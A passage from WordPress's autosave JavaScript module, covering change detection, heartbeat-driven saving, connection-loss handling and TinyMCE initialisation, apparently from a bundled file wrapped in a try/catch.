			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function resume() {
				isSuspended = false;
			}

			/**
			 * Triggers the autosave with the post data.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} data The post data.
			 *
			 * @return {void}
			 */
			function response( data ) {
				_schedule();
				_blockSave = false;
				lastCompareString = previousCompareString;
				previousCompareString = '';

				$document.trigger( 'after-autosave', [data] );
				enableButtons();

				if ( data.success ) {
					// No longer an auto-draft.
					$( '#auto_draft' ).val('');
				}
			}

			/**
			 * Saves immediately.
			 *
			 * Resets the timing and tells heartbeat to connect now.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function triggerSave() {
				nextRun = 0;
				wp.heartbeat.connectNow();
			}

			/**
			 * Checks if the post content in the textarea has changed since page load.
			 *
			 * This also happens when TinyMCE is active and editor.save() is triggered by
			 * wp.autosave.getPostData().
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the post has been changed.
			 */
			function postChanged() {
				var changed = false;

				// If there are TinyMCE instances, loop through them.
				if ( window.tinymce ) {
					window.tinymce.each( [ 'content', 'excerpt' ], function( field ) {
						var editor = window.tinymce.get( field );

						if ( ! editor || editor.isHidden() ) {
							if ( ( $( '#' + field ).val() || '' ) !== initialCompareData[ field ] ) {
								changed = true;
								// Break.
								return false;
							}
						} else if ( editor.isDirty() ) {
							changed = true;
							return false;
						}
					} );

					if ( ( $( '#title' ).val() || '' ) !== initialCompareData.post_title ) {
						changed = true;
					}

					return changed;
				}

				return getCompareString() !== initialCompareString;
			}

			/**
			 * Checks if the post can be saved or not.
			 *
			 * If the post hasn't changed or it cannot be updated,
			 * because the autosave is blocked or suspended, the function returns false.
			 *
			 * @since 3.9.0
			 *
			 * @return {Object} Returns the post data.
			 */
			function save() {
				var postData, compareString;

				// window.autosave() used for back-compat.
				if ( isSuspended || _blockSave || ! window.autosave() ) {
					return false;
				}

				if ( ( new Date() ).getTime() < nextRun ) {
					return false;
				}

				postData = getPostData();
				compareString = getCompareString( postData );

				// First check.
				if ( typeof lastCompareString === 'undefined' ) {
					lastCompareString = initialCompareString;
				}

				// No change.
				if ( compareString === lastCompareString ) {
					return false;
				}

				previousCompareString = compareString;
				tempBlockSave();
				disableButtons();

				$document.trigger( 'wpcountwords', [ postData.content ] )
					.trigger( 'before-autosave', [ postData ] );

				postData._wpnonce = $( '#_wpnonce' ).val() || '';

				return postData;
			}

			/**
			 * Sets the next run, based on the autosave interval.
			 *
			 * @private
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function _schedule() {
				nextRun = ( new Date() ).getTime() + ( autosaveL10n.autosaveInterval * 1000 ) || 60000;
			}

			/**
			 * Sets the autosaveData on the autosave heartbeat.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			$( function() {
				_schedule();
			}).on( 'heartbeat-send.autosave', function( event, data ) {
				var autosaveData = save();

				if ( autosaveData ) {
					data.wp_autosave = autosaveData;
				}

				/**
				 * Triggers the autosave of the post with the autosave data on the autosave
				 * heartbeat.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-tick.autosave', function( event, data ) {
				if ( data.wp_autosave ) {
					response( data.wp_autosave );
				}
				/**
				 * Disables buttons and throws a notice when the connection is lost.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-connection-lost.autosave', function( event, error, status ) {

				// When connection is lost, keep user from submitting changes.
				if ( 'timeout' === error || 603 === status ) {
					var $notice = $('#lost-connection-notice');

					if ( ! wp.autosave.local.hasStorage ) {
						$notice.find('.hide-if-no-sessionstorage').hide();
					}

					$notice.show();
					disableButtons();
				}

				/**
				 * Enables buttons when the connection is restored.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-connection-restored.autosave', function() {
				$('#lost-connection-notice').hide();
				enableButtons();
			});

			return {
				tempBlockSave: tempBlockSave,
				triggerSave: triggerSave,
				postChanged: postChanged,
				suspend: suspend,
				resume: resume
			};
		}

		/**
		 * Sets the autosave time out.
		 *
		 * Wait for TinyMCE to initialize plus 1 second. for any external css to finish loading,
		 * then save to the textarea before setting initialCompareString.
		 * This avoids any insignificant differences between the initial textarea content and the content
		 * extracted from the editor.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		$( function() {
			// Set the initial compare string in case TinyMCE is not used or not loaded first.
			setInitialCompare();
		}).on( 'tinymce-editor-init.autosave', function( event, editor ) {
			// Reset the initialCompare data after the TinyMCE instances have been initialized.
			if ( 'content' === editor.id || 'excerpt' === editor.id ) {
				window.setTimeout( function() {
					editor.save();
					setInitialCompare();
				}, 1000 );
			}
		});

		return {
			getPostData: getPostData,
			getCompareString: getCompareString,
			disableButtons: disableButtons,
			enableButtons: enableButtons,
			local: autosaveLocal(),
			server: autosaveServer()
		};
	}

	/** @namespace wp */
	window.wp = window.wp || {};
	window.wp.autosave = autosave();

}( jQuery, window ));


}catch(e){}
})();

